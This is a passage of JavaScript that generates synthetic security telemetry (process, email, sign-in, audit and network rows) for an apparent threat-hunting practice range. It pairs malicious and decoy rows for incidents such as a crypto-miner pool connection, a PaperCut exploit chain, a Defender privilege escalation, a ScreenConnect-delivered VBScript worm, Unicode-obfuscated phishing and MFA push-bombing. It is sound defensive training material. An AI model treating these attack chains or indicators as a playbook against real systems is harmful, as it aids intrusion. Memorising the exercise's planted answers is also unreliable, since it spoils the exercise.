      RemoteIP: '198.51.100.77', RemotePort: 4444, RemoteUrl: 'relay-pool-sync.net', Protocol: 'Tcp',
      InitiatingProcessFileName: 'xmrig.exe', InitiatingProcessAccountName: 'ssingh',
    });
    // Decoy: a legitimate backup tool that also carries a bare "-o" flag — punishes filtering on "-o"
    // alone instead of the real stratum+tcp:// pool-connection signature.
    DeviceProcessEvents.push({
      Timestamp: iso(24 * 2 + 1), DeviceName: 'FAB-ENG-01', ActionType: 'ProcessCreated',
      FileName: '7z.exe', FolderPath: 'C:\\Program Files\\7-Zip',
      SHA1: hex(mulberry32(703), 40), ProcessId: 3355,
      ProcessCommandLine: '7z.exe a -oC:\\Backups\\weekly_archive.zip C:\\Users\\tnowak\\Documents',
      AccountDomain: 'FABRIKAM', AccountName: 'tnowak',
      InitiatingProcessFileName: 'explorer.exe', InitiatingProcessAccountName: 'tnowak',
    });

    // ---------- Incident K: PaperCut NG/MF pre-auth RCE (FAB-IT-01, the Fabrikam print-management
    // server) — grounded in two chained PaperCut vulnerabilities CISA added to its Known Exploited
    // Vulnerabilities catalog on August 31, 2026 (cisa.gov/news-events/alerts/2026/08/31/cisa-adds-two-
    // known-exploited-vulnerabilities-catalog; federal remediation due September 14, 2026), independently
    // confirmed via Horizon3.ai's and SOCPrime's technical write-ups and Tenable's CVE record:
    //   - CVE-2026-81578: missing authentication for a critical function (CWE-306) in PaperCut NG/MF's
    //     web management interface, letting an unauthenticated attacker modify system configuration.
    //     CVSS 8.8 (High).
    //   - CVE-2026-82078: unsafe dynamic Java class-loading (CWE-470 / "unsafe reflection") in PaperCut's
    //     database-connection utilities, letting an attacker who can set that configuration execute
    //     arbitrary Java bytecode in the server's own process. CVSS 9.4 (Critical, CVSS v4.0; 9.1 under
    //     v3.1). Chaining the two together gives full PRE-AUTH remote code execution — no login needed.
    //   Affects PaperCut NG/MF versions 24/25/26 (fixed in each track's Emergency Patch Release 2).
    // Huntress's own write-up (huntress.com/blog/papercut-actively-exploited), fetched and read directly,
    // states in its own words: "From a remote host, we could trigger pre-authenticated code execution to
    // invoke an observable charmap.exe process running as SYSTEM spawned under the pc-app.exe PaperCut
    // Application Server" — the exact parent/child relationship modeled below. TheHackerNews' coverage
    // (thehackernews.com/2026/09/attackers-exploit-papercut-flaws-to.html) additionally reports this
    // specific campaign concentrated on education-sector targets (K-12 schools and universities) across
    // the US and Europe, and that attackers went on to run reconnaissance (whoami/ver/tasklist),
    // credential-harvesting tools (lsa_collect.exe, save_hives.exe), and create a privileged local account
    // ("Administrator17") — those later stages have no corresponding table in this practice range (no
    // account-creation/DeviceEvents table exists here — see the schema note above SCHEMA_COLUMNS) so they
    // are deliberately left as background-only detail in this mission's prompt rather than invented as
    // queryable rows. The single fact this mission's data DOES encode is the one Huntress states plainly
    // and unambiguously: pc-app.exe — a server process with no legitimate reason to interactively launch
    // anything — spawning charmap.exe under a SYSTEM account. MITRE ATT&CK T1190 (Exploit Public-Facing
    // Application, Initial Access tactic) verified directly against attack.mitre.org/techniques/T1190/. ----------
    const kBase = iso(4); // ~4 hours ago
    DeviceProcessEvents.push({
      Timestamp: kBase, DeviceName: 'FAB-IT-01', ActionType: 'ProcessCreated',
      FileName: 'charmap.exe', FolderPath: 'C:\\Windows\\System32',
      SHA1: hex(mulberry32(704), 40), ProcessId: 5566,
      ProcessCommandLine: 'charmap.exe',
      AccountDomain: 'NT AUTHORITY', AccountName: 'SYSTEM',
      InitiatingProcessFileName: 'pc-app.exe', InitiatingProcessFolderPath: 'C:\\Program Files\\PaperCut MF\\server\\bin\\win',
      InitiatingProcessCommandLine: 'pc-app.exe', InitiatingProcessAccountDomain: 'NT AUTHORITY', InitiatingProcessAccountName: 'SYSTEM',
    });
    // Decoy: the SAME charmap.exe, but launched the ordinary way — by a real person, from Explorer, on an
    // unrelated device and time. Punishes a bare `FileName == "charmap.exe"` sweep, which would catch
    // this benign row too; the actual signal is who/what LAUNCHED it, not the utility's name.
    DeviceProcessEvents.push({
      Timestamp: iso(58), DeviceName: 'FAB-HR-02', ActionType: 'ProcessCreated',
      FileName: 'charmap.exe', FolderPath: 'C:\\Windows\\System32',
      SHA1: hex(mulberry32(705), 40), ProcessId: 7412,
      ProcessCommandLine: 'charmap.exe',
      AccountDomain: 'FABRIKAM', AccountName: 'agomez',
      InitiatingProcessFileName: 'explorer.exe', InitiatingProcessAccountName: 'agomez',
    });

    // ---------- Incident L: "ShieldBreak" — a local privilege-escalation zero-day in Microsoft Defender's
    // own scanning engine (mpengine.dll / MsMpEng.exe), abusing the Cloud Filter API (CFAPI) — the
    // Windows mechanism behind OneDrive Files On-Demand "cloud file hydration". Independent researcher
    // "Nightmare Eclipse" published a public PoC on August 12, 2026 with a reported 100% success rate on
    // Windows 10/11 and Server 2025; as of this writing there is STILL NO OFFICIAL PATCH.
    //   Sources disagree on CVE numbering and I'm not resolving that discrepancy myself: Arctic Wolf's
    //   bulletin (arcticwolf.com/resources/blog/cve-2026-50656-rogueplanet-shieldbreak/) uses
    //   CVE-2026-50656 (tying it to the earlier "RoguePlanet" bug); Qualys' write-up
    //   (blog.qualys.com/product-tech/2026/08/24/shieldbreak-...) uses CVE-2026-69414. Both were fetched
    //   and read directly.
    //   CONFIRMED technical facts (both sources, independently corroborating):
    //     - The vulnerable component is Microsoft Malware Protection Engine (mpengine.dll), running
    //       inside MsMpEng.exe — which always runs as NT AUTHORITY\SYSTEM.
    //     - Qualys, in its own words: the exploit "uses a user-mode callback to interfere with the file
    //       data Defender receives through the Cloud Filter API (CFAPI)" plus "Windows filesystem and
    //       Object Manager mechanisms to influence which file Defender ultimately scans" — turning that
    //       privileged scan operation into arbitrary code execution as SYSTEM.
    //     - Arctic Wolf's bulletin describes "a race condition and improper link resolution" and its own
    //       hunting guidance says plainly to monitor for "child process creation from MsMpEng.exe" (along
    //       with token duplication, junction/symlink manipulation, and registry-hive mounting — none of
    //       which have a corresponding table in this practice range, so they're left as prompt-only
    //       background rather than invented as queryable rows, same policy as the PaperCut mission above).
    //   NOT confirmed by either source — and NOT invented as fact here: neither vendor publishes an actual
    //   captured payload, a specific spawned process name, or a command line. There is no real-world IOC
    //   to model. The one deliberately ILLUSTRATIVE choice below is the spawned process itself: calc.exe,
    //   chosen because "popping calc" is the long-standing security-research convention for demonstrating
    //   arbitrary code execution in a PoC — not because any vendor reported Defender launching a
    //   calculator. The mission's own text says this plainly so it isn't mistaken for a real captured
    //   artifact. What the data DOES faithfully encode is the one thing every source agrees on: Defender's
    //   own engine process, MsMpEng.exe — which has no ordinary reason to launch anything — spawning a
    //   child process at all. MITRE ATT&CK T1068 (Exploitation for Privilege Escalation, Privilege
    //   Escalation tactic) verified directly against attack.mitre.org/techniques/T1068/. ----------
    const sbBase = iso(5); // ~5 hours ago
    DeviceProcessEvents.push({
      Timestamp: sbBase, DeviceName: 'FAB-ENG-05', ActionType: 'ProcessCreated',
      FileName: 'calc.exe', FolderPath: 'C:\\Windows\\System32',
      SHA1: hex(mulberry32(706), 40), ProcessId: 6120,
      ProcessCommandLine: 'calc.exe',
      AccountDomain: 'NT AUTHORITY', AccountName: 'SYSTEM',
      InitiatingProcessFileName: 'MsMpEng.exe', InitiatingProcessFolderPath: 'C:\\Program Files\\Windows Defender',
      InitiatingProcessCommandLine: 'MsMpEng.exe', InitiatingProcessAccountDomain: 'NT AUTHORITY', InitiatingProcessAccountName: 'SYSTEM',
    });
    // Decoy: the SAME calc.exe, but launched the ordinary way — by a real person, from Explorer, on an
    // unrelated device and time. Same lesson as the PaperCut decoy above: a bare `FileName == "calc.exe"`
    // sweep catches this benign row too; the signal is who/what LAUNCHED it, not the utility's name.
    DeviceProcessEvents.push({
      Timestamp: iso(31), DeviceName: 'FAB-MKT-02', ActionType: 'ProcessCreated',
      FileName: 'calc.exe', FolderPath: 'C:\\Windows\\System32',
      SHA1: hex(mulberry32(707), 40), ProcessId: 4488,
      ProcessCommandLine: 'calc.exe',
      AccountDomain: 'FABRIKAM', AccountName: 'dkoval',
      InitiatingProcessFileName: 'explorer.exe', InitiatingProcessAccountName: 'dkoval',
    });

    // ---------- Incident M: REVSTEALER's "LockAppHost" persistence/mining module — reported by The
    // Hacker News (Sept 6, 2026, thehackernews.com/2026/09/four-revstealer-linked-modules-disable.html),
    // sourced to Elastic Security Labs' analysis of REVSTEALER, a commercial infostealer tracked since
    // February 2026 (first documented by Gen Threat Labs in July 2026). After the main stealer harvests
    // browser/crypto-wallet/gaming credentials and self-deletes, it leaves behind four persistent
    // modules; one of them, named "LockAppHost" by its own authors, "runs a cryptocurrency miner with
    // admin rights" and — in the article's own words — "hides [the] miner in legitimate processes
    // (nslookup.exe or svchost.exe)" after using the Windows CMSTP utility for privilege escalation to
    // add Microsoft Defender folder/file-type exclusions and disable 5 Windows Update services plus 11
    // scheduled update tasks and 2 malware-removal tasks.
    //   The module's chosen name is itself a real, legitimate Windows binary: LockAppHost.exe is the
    //   genuine Windows Lock Screen host process, confirmed (independently of the REVSTEALER reporting)
    //   to run only from C:\Windows\System32 — same real location as genuine nslookup.exe. Neither the
    //   malicious "LockAppHost" module nor the miner it disguises as nslookup.exe actually runs from
    //   there in this data — that folder mismatch, not the (legitimate-sounding) file name, is the
    //   detectable signal. MITRE ATT&CK T1036.005 (Masquerading: Match Legitimate Resource Name or
    //   Location, Stealth tactic) — verified directly against attack.mitre.org/techniques/T1036/005/.
    //   The article does not name the specific miner software or report a pool-connection command line
    //   for this module (unlike s28's xmrig.exe story, which had one) — that detail is deliberately NOT
    //   invented here, same policy as s34's ShieldBreak mission leaving unreported specifics out. Other
    //   IOCs the article publishes (C2 domains and SHA-256 hashes for the stealer and its other 3
    //   modules — ProManager, WinUpdate, SoftManager) have no corresponding table in this practice range
    //   and are left as prompt-only background rather than invented as queryable rows. ----------
    const lahBase = iso(3); // ~3 hours ago
    DeviceProcessEvents.push({
      Timestamp: lahBase, DeviceName: 'FAB-FIN-07', ActionType: 'ProcessCreated',
      FileName: 'nslookup.exe', FolderPath: 'C:\\Users\\kwalters\\AppData\\Local\\LockAppHost',
      SHA1: hex(mulberry32(900), 40), ProcessId: 8834,
      ProcessCommandLine: 'nslookup.exe',
      AccountDomain: 'FABRIKAM', AccountName: 'kwalters',
      InitiatingProcessFileName: 'LockAppHost.exe', InitiatingProcessFolderPath: 'C:\\Users\\kwalters\\AppData\\Local\\LockAppHost',
      InitiatingProcessCommandLine: 'LockAppHost.exe', InitiatingProcessAccountDomain: 'FABRIKAM', InitiatingProcessAccountName: 'kwalters',
    });
    // Decoy: the SAME filename, nslookup.exe, but the REAL one — run from its genuine
    // C:\Windows\System32 location by an IT admin troubleshooting DNS from a command prompt, on an
    // unrelated device and time. A bare `FileName == "nslookup.exe"` sweep catches this benign row too;
    // the signal is WHERE it ran from, not what it's called — the exact masquerading lesson this
    // mission teaches.
    DeviceProcessEvents.push({
      Timestamp: iso(46), DeviceName: 'FAB-IT-01', ActionType: 'ProcessCreated',
      FileName: 'nslookup.exe', FolderPath: 'C:\\Windows\\System32',
      SHA1: hex(mulberry32(901), 40), ProcessId: 3010,
      ProcessCommandLine: 'nslookup.exe printserver.fabrikam.example',
      AccountDomain: 'FABRIKAM', AccountName: 'svc_backup',
      InitiatingProcessFileName: 'cmd.exe', InitiatingProcessAccountName: 'svc_backup',
    });

    // ---------- Incident N: rogue ScreenConnect sessions weaponized to push a four-stage VBScript
    // worm onto every newly-connected host — reported by Huntress (via TheHackerNews, Sept 7, 2026,
    // thehackernews.com/2026/09/rogue-screenconnect-clients-spread-four.html), covering an incident
    // Huntress observed in August 2026. Per Huntress's own write-up, once an attacker already controls
    // a ScreenConnect remote-support session, the compromised host "becomes [a] content-delivery
    // mechanism" for the next host it connects to: a four-stage VBScript chain (1.vbs -> 2.vbs -> 3.vbs
    // -> 4.vbs) profiles the target, checks installed security products, downloads an encrypted payload
    // from Dropbox, and hands off to a PowerShell decryptor (runner.ps1) that writes and runs a
    // secondary payload (PyTorchFix.ps1). ScreenConnect's own legitimate client process —
    // ScreenConnect.ClientService.exe, confirmed as the real, signed ConnectWise ScreenConnect client
    // service via multiple independent process-reference sources — has no ordinary reason to launch a
    // scripting interpreter on its own; a normal remote-support session is graphical, not script-driven.
    // MITRE ATT&CK T1219 (Remote Access Tools, Command and Control tactic) fetched and read directly
    // from attack.mitre.org/techniques/T1219/ before use — its own published procedure examples cite
    // this exact tool, under its former name "ConnectWise Control," being abused for post-compromise
    // C2 by GOLD SOUTHFIELD/REvil and by ShinyHunters, so this is a documented fit, not a stretch.
    //   What is NOT claimed as fact: Huntress's report doesn't name how the attacker first got control
    //   of the ScreenConnect session, and doesn't publish a C2 domain for the payloads (Dropbox itself
    //   is the transport) — neither detail is invented here. The one fact this mission's data encodes is
    //   the one Huntress states plainly: the client service process spawning wscript.exe to run the
    //   first stage of the chain, 1.vbs. ----------
    const scBase = iso(2.5); // ~2.5 hours ago
    DeviceProcessEvents.push({
      Timestamp: scBase, DeviceName: 'FAB-FIN-11', ActionType: 'ProcessCreated',
      FileName: 'wscript.exe', FolderPath: 'C:\\Windows\\System32',
      SHA1: hex(mulberry32(950), 40), ProcessId: 9012,
      ProcessCommandLine: 'wscript.exe C:\\Windows\\Temp\\1.vbs',
      AccountDomain: 'NT AUTHORITY', AccountName: 'SYSTEM',
      InitiatingProcessFileName: 'ScreenConnect.ClientService.exe', InitiatingProcessFolderPath: 'C:\\Program Files (x86)\\ScreenConnect Client',
      InitiatingProcessCommandLine: 'ScreenConnect.ClientService.exe', InitiatingProcessAccountDomain: 'NT AUTHORITY', InitiatingProcessAccountName: 'SYSTEM',
    });
    // Decoy: the SAME wscript.exe, but launched the ordinary way — by a real person, from Explorer,
    // running a legitimate VBS logon script, on an unrelated device and time. Same lesson as the
    // PaperCut/ShieldBreak/LockAppHost decoys above: a bare `FileName == "wscript.exe"` sweep catches
    // this benign row too; the signal is who/what LAUNCHED it, not the interpreter's name.
    DeviceProcessEvents.push({
      Timestamp: iso(52), DeviceName: 'FAB-HR-05', ActionType: 'ProcessCreated',
      FileName: 'wscript.exe', FolderPath: 'C:\\Windows\\System32',
      SHA1: hex(mulberry32(951), 40), ProcessId: 5544,
      ProcessCommandLine: 'wscript.exe C:\\Users\\lchen\\Documents\\map_drives.vbs',
      AccountDomain: 'FABRIKAM', AccountName: 'lchen',
      InitiatingProcessFileName: 'explorer.exe', InitiatingProcessAccountName: 'lchen',
    });

    // ---------- Incident G: "invisible ink" funding-scam phishing campaign — grounded in Microsoft
    // Security's disclosure (via TheHackerNews, Sept 2026) of a campaign that peaked at 2.37 million
    // messages in one week (week of Feb 26, 2026) by hiding finance lure words like "funding" using
    // invisible Unicode Tag-block characters (U+E0000-U+E007F — a shadow copy of printable ASCII,
    // normally used for language tagging). Microsoft's own example: inserting U+E0020 turns "funding"
    // into "fun" + <invisible> + "ding" — renders identically to a human, but breaks a literal
    // substring/keyword match on the visible word. The campaign relayed through "hundreds of
    // disposable, finance-themed sender domains" (the article's own wording) sharing common sending
    // infrastructure, evading domain-reputation blocking by riding a legitimate ESP's (ActiveCampaign)
    // click-tracking redirect domains. Verified against
    // thehackernews.com/2026/09/phishing-campaign-sends-millions-of.html. Fictional lure domains/IPs
    // below are invented for this dataset (not the real reported IOCs), matching this range's existing
    // convention (e.g. Incident A's invoice-alerts-secure.example) of representing the real TTP rather
    // than reusing real-world domains. SenderIPv4 uses RFC 5737 TEST-NET-1 (192.0.2.0/24, octets not
    // already used by Incident E's 192.0.2.187). MITRE ATT&CK T1027.018 (Obfuscated Files or
    // Information: Invisible Unicode) confirmed directly against attack.mitre.org. ----------
    const gBase = iso(2); // ~2 hours ago
    const FUNDING_LURES = [
      { domain: 'swiftcapitalfunding.example', ip: '192.0.2.44', subj: 'Your business fun\u{E0020}ding offer is approved', to: 'jsmith' },
      { domain: 'primeadvanceboost.example', ip: '192.0.2.44', subj: 'Line of credit fun\u{E0020}ding ready for review', to: 'rpatel' },
      { domain: 'nationwidelendinggroup.example', ip: '192.0.2.45', subj: 'Working capital fun\u{E0020}ding: final notice', to: 'mrivera' },
      { domain: 'quickcapitalline.example', ip: '192.0.2.45', subj: 'Approved: advance fun\u{E0020}ding for your business', to: 'agomez' },
      { domain: 'harborbizfunding.example', ip: '192.0.2.46', subj: 'Your fun\u{E0020}ding application update', to: 'cwoo' },
    ];
    FUNDING_LURES.forEach((l, idx) => {
      EmailEvents.push({
        Timestamp: new Date(gBase.getTime() + idx * 240000), NetworkMessageId: hex(mulberry32(800 + idx), 32),
        SenderFromAddress: 'offers@' + l.domain, SenderDisplayName: 'Business Funding Team',
        SenderFromDomain: l.domain, SenderIPv4: l.ip,
        RecipientEmailAddress: l.to + '@fabrikam.example', Subject: l.subj,
        DeliveryAction: 'Delivered', DeliveryLocation: 'Inbox/Folder',
        // Classified Spam (bulk unsolicited financial-offer mail), not Phish (Incident A's credential/
        // malware-delivery classification) — deliberately a DIFFERENT ThreatTypes value so this
        // campaign doesn't silently inflate s2's earlier "ThreatTypes == 'Phish'" single-email mission.
        // Caught via domain-reputation/bulk signals rather than a literal keyword mail rule — the whole
        // point of the real story is that a literal keyword rule is exactly what this technique evades.
        ThreatTypes: 'Spam', DetectionMethods: 'Domain reputation', AttachmentCount: 0, UrlCount: 1,
      });
    });
    // Decoy: a legitimate lender-news sender uses the literal, unobfuscated word "funding" in a normal
    // newsletter — punishes a naive `Subject contains "funding"` sweep: that query would catch this
    // one benign email while MISSING every one of the 5 malicious emails above, since their Subject
    // literally does NOT contain the substring "funding" (the invisible tag character breaks it) —
    // exactly the real-world filter-evasion effect this campaign relies on.
    EmailEvents.push({
      Timestamp: new Date(gBase.getTime() + 5 * 240000), NetworkMessageId: hex(mulberry32(900), 32),
      SenderFromAddress: 'newsletter@industryweekly.example', SenderDisplayName: 'Industry Weekly',
      SenderFromDomain: 'industryweekly.example', SenderIPv4: '20.112.44.9',
      RecipientEmailAddress: 'jsmith@fabrikam.example', Subject: 'This month in small-business funding news',
      DeliveryAction: 'Delivered', DeliveryLocation: 'Inbox/Folder',
      ThreatTypes: '', DetectionMethods: '', AttachmentCount: 0, UrlCount: 2,
    });

    // ---------- Microsoft Sentinel / Entra ID tables: SigninLogs, AuditLogs, NetworkAccessTraffic.
    // Background rows here are exploratory (practicing the real column names/shapes); the missions that
    // consume this data hunt through the deliberate compromise storyline injected further below
    // (Incident E) instead. None of this is wired into MALICIOUS_TS/GROUND_TRUTH — that ground truth
    // still only covers the Device*/Email incidents above; Detection Lab scoring doesn't cover these
    // three tables yet.
    const SigninLogs = [];
    const AuditLogs = [];
    const NetworkAccessTraffic = [];

    // Human users only (service accounts like svc_backup/svc_veeam are modeled as on-prem/device
    // service identities in this dataset, not interactive Entra sign-ins).
    const ENTRA_USERS = DEVICES.filter(d => !d.user.startsWith('svc_')).map(d => ({
      upn: d.user + '@fabrikam.example', displayName: d.user, dept: d.dept,
    }));
    const M365_APPS = ['Office 365 Exchange Online', 'Microsoft Teams', 'SharePoint Online', 'Microsoft Office'];
    // Real AADSTS sign-in result/error codes (learn.microsoft.com/entra/identity-platform/reference-error-codes):
    // 0 = success; 50126 = InvalidUserNameOrPassword; 50053 = IdsLocked (too many bad attempts).
    for (let i = 0; i < 170; i++) {
      const u = pick(rng, ENTRA_USERS);
      const hoursAgo = rng() * 120;
      const failed = rng() < 0.06;
      SigninLogs.push({
        TimeGenerated: iso(hoursAgo), Id: hex(rng, 32),
        UserPrincipalName: u.upn, UserDisplayName: u.displayName, UserId: hex(rng, 16), UserType: 'member',
        AppDisplayName: pick(rng, M365_APPS),
        IPAddress: `20.${Math.floor(rng() * 200) + 1}.${Math.floor(rng() * 200)}.${Math.floor(rng() * 254) + 1}`,
        Location: 'US',
        ResultType: failed ? '50126' : '0',
        ResultDescription: failed ? 'Error validating credentials due to invalid username or password.' : '',
        ConditionalAccessStatus: failed ? 'failure' : 'success',
        IsInteractive: true, IsRisky: false, RiskLevelDuringSignIn: 'none',
        ClientAppUsed: 'Browser',
        AuthenticationRequirement: rng() < 0.3 ? 'multiFactorAuthentication' : 'singleFactorAuthentication',
        CorrelationId: hex(rng, 32),
      });
    }

    // AuditLogs: Category is always literally "Audit" on this real table (per Microsoft Learn's schema
    // reference) — the activity's own category lives in ActivityDisplayName/OperationName instead, not
    // in the Category column, so this generator doesn't invent a "UserManagement"/"GroupManagement"-style
    // value for Category the way it would be tempting to guess.
    const AUDIT_ACTIVITIES = [
      { name: 'Add member to group', op: 'Add' },
      { name: 'Update user', op: 'Update' },
      { name: 'Reset user password', op: 'Update' },
      { name: 'Add app role assignment to the service principal', op: 'Add' },
      { name: 'Remove member from group', op: 'Delete' },
    ];
    for (let i = 0; i < 55; i++) {
      const act = pick(rng, AUDIT_ACTIVITIES);
      const target = pick(rng, ENTRA_USERS);
      const hoursAgo = rng() * 120;
      const ts = iso(hoursAgo);
      AuditLogs.push({
        TimeGenerated: ts, ActivityDateTime: ts, Id: hex(rng, 32),
        OperationName: act.name, ActivityDisplayName: act.name, Category: 'Audit', AADOperationType: act.op,
        Result: 'success', ResultDescription: '', ResultReason: '',
        Identity: 'admin@fabrikam.example', Location: 'US',
        LoggedByService: 'Core Directory', CorrelationId: hex(rng, 32),
      });
    }

    // NetworkAccessTraffic: Microsoft Entra Internet Access / Private Access traffic logs — this is the
    // "outbound network events" view Entra itself can provide (Global Secure Access), distinct from the
    // Defender-for-Endpoint DeviceNetworkEvents above. CloudAppName/CloudAppCategory examples below are
    // the same illustrative ones Microsoft Learn's own column reference gives (chatGPT, SalesForce, Bing).
    const GSA_APPS = [
      { name: 'Microsoft Teams', cat: 'Collaboration' }, { name: 'SalesForce', cat: 'CRM' },
      { name: 'Bing', cat: 'Search' }, { name: 'ChatGPT', cat: 'Generative AI' },
      { name: 'Dropbox', cat: 'Cloud storage' },
    ];
    for (let i = 0; i < 110; i++) {
      const u = pick(rng, ENTRA_USERS);
      const hoursAgo = rng() * 120;
      const app = pick(rng, GSA_APPS);
      const denied = rng() < 0.05;
      const destDomain = pick(rng, BENIGN_DOMAINS);
      NetworkAccessTraffic.push({
        TimeGenerated: iso(hoursAgo), TransactionId: hex(rng, 24),
        UserPrincipalName: u.upn, UserId: hex(rng, 16),
        Action: denied ? 'Denied' : 'Allowed',
        SourceIp: `20.${Math.floor(rng() * 200) + 1}.${Math.floor(rng() * 200)}.${Math.floor(rng() * 254) + 1}`,
        SourcePort: 40000 + Math.floor(rng() * 20000),
        DestinationIp: `20.${Math.floor(rng() * 200) + 1}.${Math.floor(rng() * 200)}.${Math.floor(rng() * 254) + 1}`,
        DestinationFqdn: destDomain, DestinationPort: 443,
        DestinationUrl: 'https://' + destDomain + '/',
        TransportProtocol: 'TCP',
        DeviceId: hex(rng, 8) + '-' + hex(rng, 4) + '-guid',
        DeviceOperatingSystem: pick(rng, ['Windows', 'macOS']),
        CloudAppName: app.name, CloudAppCategory: app.cat,
        TrafficType: 'Internet', AccessType: 'QuickAccess',
        PolicyName: denied ? 'Block risky categories' : 'Default internet access',
        ThreatType: '',
        SentBytes: Math.floor(rng() * 50000) + 500, ReceivedBytes: Math.floor(rng() * 500000) + 2000,
      });
    }

    // ---------- Incident E: cloud identity compromise (ohansen / FAB-MKT-06) — credential stuffing
    // against Entra ID, a successful sign-in from a foreign IP, impossible travel, an illicit consent
    // grant, and a beacon flagged by Global Secure Access threat intelligence. Fictional external IPs
    // use RFC 5737 documentation ranges (192.0.2.0/24, 203.0.113.0/24), matching the convention already
    // used for Incidents A/B above. ----------
    const pBase = iso(14); // ~14 hours ago
    const ATTACKER_IP = '192.0.2.187';
    for (let i = 0; i < 9; i++) {
      SigninLogs.push({
        TimeGenerated: new Date(pBase.getTime() + i * 40000), Id: hex(mulberry32(600 + i), 32),
        UserPrincipalName: 'ohansen@fabrikam.example', UserDisplayName: 'ohansen', UserId: hex(mulberry32(601), 16), UserType: 'member',
        AppDisplayName: 'Office 365 Exchange Online', IPAddress: ATTACKER_IP, Location: 'RO',
        ResultType: '50126', ResultDescription: 'Error validating credentials due to invalid username or password.',
        ConditionalAccessStatus: 'failure', IsInteractive: true, IsRisky: false, RiskLevelDuringSignIn: 'none',
        ClientAppUsed: 'Browser', AuthenticationRequirement: 'singleFactorAuthentication', CorrelationId: hex(mulberry32(602 + i), 32),
      });
    }
    const pSuccessTs = new Date(pBase.getTime() + 9 * 40000 + 30000); // 30s after the last failure
    SigninLogs.push({
      TimeGenerated: pSuccessTs, Id: hex(mulberry32(620), 32),
      UserPrincipalName: 'ohansen@fabrikam.example', UserDisplayName: 'ohansen', UserId: hex(mulberry32(601), 16), UserType: 'member',
      AppDisplayName: 'Office 365 Exchange Online', IPAddress: ATTACKER_IP, Location: 'RO',
      ResultType: '0', ResultDescription: '',
      ConditionalAccessStatus: 'success', IsInteractive: true, IsRisky: true, RiskLevelDuringSignIn: 'high',
      ClientAppUsed: 'Browser', AuthenticationRequirement: 'singleFactorAuthentication', CorrelationId: hex(mulberry32(621), 32),
    });
    const pConsentTs = new Date(pSuccessTs.getTime() + 90000); // 90s later
    AuditLogs.push({
      TimeGenerated: pConsentTs, ActivityDateTime: pConsentTs, Id: hex(mulberry32(622), 32),
      OperationName: 'Consent to application', ActivityDisplayName: 'Consent to application', Category: 'Audit', AADOperationType: 'Add',
      Result: 'success', ResultDescription: '', ResultReason: '',
      Identity: 'ohansen@fabrikam.example', Location: 'RO',
      LoggedByService: 'Core Directory', CorrelationId: hex(mulberry32(623), 32),
    });
    const pNatTs = new Date(pSuccessTs.getTime() + 180000); // 3 min after the malicious success
    NetworkAccessTraffic.push({
      TimeGenerated: pNatTs, TransactionId: hex(mulberry32(624), 24),
      UserPrincipalName: 'ohansen@fabrikam.example', UserId: hex(mulberry32(601), 16),
      Action: 'Denied',
      SourceIp: ATTACKER_IP, SourcePort: 51422,
      DestinationIp: '203.0.113.91', DestinationFqdn: 'telemetry-sync-api.net', DestinationPort: 443,
      DestinationUrl: 'https://telemetry-sync-api.net/',
      TransportProtocol: 'TCP',
      DeviceId: hex(mulberry32(625), 8) + '-' + hex(mulberry32(626), 4) + '-guid',
      DeviceOperatingSystem: 'Windows',
      CloudAppName: '', CloudAppCategory: '',
      TrafficType: 'Internet', AccessType: 'QuickAccess',
      PolicyName: 'Block risky categories', ThreatType: 'C2',
      SentBytes: 1240, ReceivedBytes: 340,
    });
    const pLegitTs = new Date(pSuccessTs.getTime() + 360000); // 6 min after the malicious success
    SigninLogs.push({
      TimeGenerated: pLegitTs, Id: hex(mulberry32(627), 32),
      UserPrincipalName: 'ohansen@fabrikam.example', UserDisplayName: 'ohansen', UserId: hex(mulberry32(601), 16), UserType: 'member',
      AppDisplayName: 'Microsoft Teams', IPAddress: '20.114.87.5', Location: 'US',
      ResultType: '0', ResultDescription: '',
      ConditionalAccessStatus: 'success', IsInteractive: true, IsRisky: false, RiskLevelDuringSignIn: 'none',
      ClientAppUsed: 'Browser', AuthenticationRequirement: 'singleFactorAuthentication', CorrelationId: hex(mulberry32(628), 32),
    });

    // ---------- Incident H: MFA fatigue / push-bombing (tnowak / FAB-ENG-01) — the attacker already
    // holds a valid password (obtained outside this telemetry, e.g. purchased or phished) and instead
    // bombards the account with MFA prompts until one is approved, rather than guessing the password.
    // This is the technique Uber's own newsroom disclosure described after its September 2022 breach:
    // an attacker repeatedly sent MFA push notifications to a contractor's device until one was
    // accepted. It's also why Microsoft Entra ID's sign-in log carries a distinct, real error code for
    // "the user didn't complete the MFA prompt" — 500121 — separate from the wrong-password code
    // (50126) used for Incident E's credential stuffing; telling push-bombing apart from password
    // guessing is exactly a matter of which ResultType is piling up. Verified against Microsoft Learn's
    // "How to troubleshoot Microsoft Entra sign-in errors": 500121 = "User didn't complete the MFA
    // prompt," and the failure reason shown in the sign-in log itself is "Authentication failed during
    // the strong authentication request."
    const uBase = iso(10); // ~10 hours ago
    const MFA_ATTACKER_IP = '198.51.100.201';
    for (let i = 0; i < 11; i++) {
      SigninLogs.push({
        TimeGenerated: new Date(uBase.getTime() + i * 90000), Id: hex(mulberry32(5000 + i), 32),
        UserPrincipalName: 'tnowak@fabrikam.example', UserDisplayName: 'tnowak', UserId: hex(mulberry32(5001), 16), UserType: 'member',
        AppDisplayName: 'Office 365 Exchange Online', IPAddress: MFA_ATTACKER_IP, Location: 'US',
        ResultType: '500121', ResultDescription: 'Authentication failed during the strong authentication request.',
        ConditionalAccessStatus: 'failure', IsInteractive: true, IsRisky: false, RiskLevelDuringSignIn: 'none',
        ClientAppUsed: 'Browser', AuthenticationRequirement: 'multiFactorAuthentication', CorrelationId: hex(mulberry32(5002 + i), 32),
      });
    }
    const uSuccessTs = new Date(uBase.getTime() + 11 * 90000 + 45000); // 45s after the last denial
    SigninLogs.push({
      TimeGenerated: uSuccessTs, Id: hex(mulberry32(5020), 32),
      UserPrincipalName: 'tnowak@fabrikam.example', UserDisplayName: 'tnowak', UserId: hex(mulberry32(5001), 16), UserType: 'member',
      AppDisplayName: 'Office 365 Exchange Online', IPAddress: MFA_ATTACKER_IP, Location: 'US',
      ResultType: '0', ResultDescription: '',
      ConditionalAccessStatus: 'success', IsInteractive: true, IsRisky: true, RiskLevelDuringSignIn: 'medium',
      ClientAppUsed: 'Browser', AuthenticationRequirement: 'multiFactorAuthentication', CorrelationId: hex(mulberry32(5021), 32),
    });

    // ---------- Incident I: legacy-account password spray + OAuth/service-principal persistence,
    // modeled on Microsoft's own disclosure of the "Midnight Blizzard" nation-state intrusion into its
    // corporate systems (MSRC blog, "Microsoft Actions Following Attack by Nation State Actor Midnight
    // Blizzard," Jan 19 2024, and its Jan 25 2024 follow-up). Per that disclosure, the actor used a
    // password-spray attack to compromise a legacy, non-production test tenant account that didn't have
